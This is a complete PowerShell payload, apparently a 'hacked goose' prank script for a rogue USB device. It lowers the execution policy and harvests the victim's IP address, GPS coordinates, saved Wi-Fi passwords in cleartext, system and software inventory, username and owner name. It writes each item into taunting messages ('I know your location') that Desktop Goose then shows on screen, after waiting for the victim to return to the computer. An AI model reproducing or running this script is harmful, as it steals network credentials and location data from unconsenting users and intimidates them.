Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

$ErrorActionPreference = 'SilentlyContinue'

########################
$ip = "I know your IP:`r`n `r`n" + (ipconfig | Select-String "IPv4 Address").ToString() -replace '.*?(\d+\.\d+\.\d+\.\d+).*', '$1'
$ip > $env:TEMP\hg\Assets\Text\NotepadMessages\ip.txt


function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
        $GeoWatcher.Start() #Begin resolving current location

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100 #Wait for discovery.
        }  

        if ($GeoWatcher.Permission -eq 'Denied'){
            Write-Error 'Access Denied for Location Information'
        } else {
            $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
            $GL = $GL -split " "
            $Lat = $GL[0].Substring(11) -replace ".$"
            $Lon = $GL[1].Substring(10) -replace ".$" 
            return $Lat, $Lon
        }
    }
    # Write Error is just for troubleshooting
    catch {
        Write-Error "No coordinates found"
        return "No Coordinates found"
        -ErrorAction SilentlyContinue
    } 
}

$Lat, $Lon = Get-GeoLocation
$Location = "Latitude: $Lat, Longitude: $Lon"
$location = "I know your location:`r`n `r`n" +$Location
$location > $env:TEMP\hg\Assets\Text\NotepadMessages\location.txt

$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $name=$_.Matches.Groups[1].Value.Trim(); (netsh wlan show profile name="$name" key=clear) | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { [PSCustomObject]@{ SSID=$name; PASS=$_.Matches.Groups[1].Value.Trim() } } } | Format-Table -AutoSize | Out-String
$wifi = "I know your Wi-Fi's:`r`n `r`n" + $wifiProfiles
$wifi > $env:TEMP\hg\Assets\Text\NotepadMessages\wifi.txt

$os = (Get-CimInstance Win32_OperatingSystem).Caption
$software = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion)
$computerSystem = Invoke-Expression 'Get-WmiObject Win32_ComputerSystem' | Out-String
$hardware = "Is this you?:`r`n `r`n" + "OS: $os`nSoftware: $software`nComputer System: $computerSystem"
$hardware > $env:TEMP\hg\Assets\Text\NotepadMessages\hardware.txt

$name = "Hi, " + $env:USERNAME
$name > $env:TEMP\hg\Assets\Text\NotepadMessages\name.txt

$email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
$email = "Can i email you at:`r`n `r`n" + $email + "?"
$email > $env:TEMP\hg\Assets\Text\NotepadMessages\email.txt
########################

function startGoose {
    Add-Type -AssemblyName WindowsBase
    Add-Type -AssemblyName PresentationCore

    $timeout = 600 # 2 minutes in seconds
    $stopTime = (Get-Date).AddSeconds($timeout)

    Start-Process $env:TEMP\hg\GooseDesktop.exe

    while (1) {
        $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftCtrl)
        $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)

        if ($Rctrl -and $Lctrl) { powershell $env:TEMP\hg\CloseGoose.bat; exit }
        elseif ((Get-Date) -ge $stopTime) { powershell $env:TEMP\hg\CloseGoose.bat; exit }
        else { continue }
    }
}

function Target-Comes {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o = New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
            break
        } else {
            $o.SendKeys("{CAPSLOCK}")
            Start-Sleep -Seconds $pauseTime
        }
    }
}

Target-Comes
startGoose
